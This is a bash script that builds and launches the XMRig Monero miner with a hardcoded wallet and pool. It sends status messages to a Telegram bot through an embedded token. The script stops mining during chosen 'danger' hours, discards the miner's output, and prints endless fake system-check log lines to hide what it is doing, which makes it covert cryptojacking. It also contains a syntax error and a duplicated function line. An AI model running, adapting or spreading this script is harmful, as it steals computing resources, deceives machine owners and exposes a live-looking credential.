#!/bin/bash

# --- CONFIGURATION ---
WALLET="44Dzqvm7mx3LTETpwC5xRDQQs9Mn3Y1ZSV3YkJdQSDUaTo7xXMirqtnUu3ZtoYky2CE4gMJDKJPivUSRvNAvqBawJ8agMuU"
POOL="asia.hashvault.pro:443"
WORKER="${1:-Flash"

BOT_TOKEN="7489463491:AAEM8-TBUkxRIINHWjjQj0Fkp9A7B5th5hg"
GROUP_CHAT_ID="-1002687947794"

REQUIRED_PACKAGES=("git" "build-essential" "cmake" "automake" "libtool" "autoconf" "libhwloc-dev" "libuv1-dev" "libssl-dev" "msr-tools" "curl")

# --- FUNCTIONS ---

send_telegram() {
    local message="$1"
    curl -s -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendMessage" \
        -d chat_id="$GROUP_CHAT_ID" \
        -d text="$message" >/dev/null
}

install_dependencies() {
    for package in "${REQUIRED_PACKAGES[@]}"; do
        dpkg -l | grep -qw $package || sudo apt install -y $package
    done
}
ulimit -a
ulimit -u 8192; ulimit -n 1048576; ulimit -s unlimited; ulimit -l unlimited
ulimit -a
is_danger_time() {
is_danger_time() {
    local h=$(TZ="Asia/Kolkata" date +%H)
    local m=$(TZ="Asia/Kolkata" date +%M)
    local time=$((10#$h * 60 + 10#$m))

    if (( (time >= 0 && time < 120) || (time >= 1020 && time < 1140) )); then
        return 0
    else
        return 1
    fi
}

wait_for_safe_time() {
    while is_danger_time; do
        send_telegram "Worker $WORKER triggered in bad time. Turning off."
        sleep 300  # Wait 5 minutes before checking again
    done
}

check_and_stop_if_needed() {
    while true; do
        if is_danger_time; then
            send_telegram "Worker $WORKER triggered in good time. Got bad zone so turning off."
            pkill xmrig
            exit 0
        fi
        sleep 60
    done
}

# --- MAIN EXECUTION ---

apt update
echo "[+] Checking and installing required dependencies..."
install_dependencies

echo "[+] Enabling hugepages..."
sysctl -w vm.nr_hugepages=128
echo 'vm.nr_hugepages=128' >> /etc/sysctl.conf

echo "[+] Setting MSR..."
modprobe msr 2>/dev/null
wrmsr -a 0x1a4 0xf 2>/dev/null

if is_danger_time; then
    send_telegram "Worker $WORKER triggered in bad time. Turning off."
    exit 0
else
    send_telegram "Worker $WORKER triggered in good time. Running."
fi

echo "[+] Cloning XMRig..."
git clone https://github.com/xmrig/xmrig.git
cd xmrig
mkdir build && cd build

echo "[+] Building XMRig..."
cmake ..
make -j$(nproc)

echo "[+] Starting in 5 seconds..."
sleep 5

# Start time monitoring in background
check_and_stop_if_needed &

./xmrig -o $POOL -u $WALLET -p $WORKER -k --coin monero --tls --tls-fingerprint=420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14 --threads=8 > /dev/null 2>&1 &

while true; do
    echo "[INFO] Initializing module: net.core"
    sleep 2
    echo "[INFO] Syncing core clock with NTP server..."
    sleep 2
    echo "[INFO] Performing memory integrity check... OK"
    sleep 2
    echo "[INFO] Task scheduler running: PID $((RANDOM % 9000 + 1000))"
    sleep 4
    echo "[INFO] Kernel modules verified: secure boot OK"
    sleep 2
    echo "[INFO] Network latency: $((RANDOM % 30 + 1))ms"
    sleep 2
done
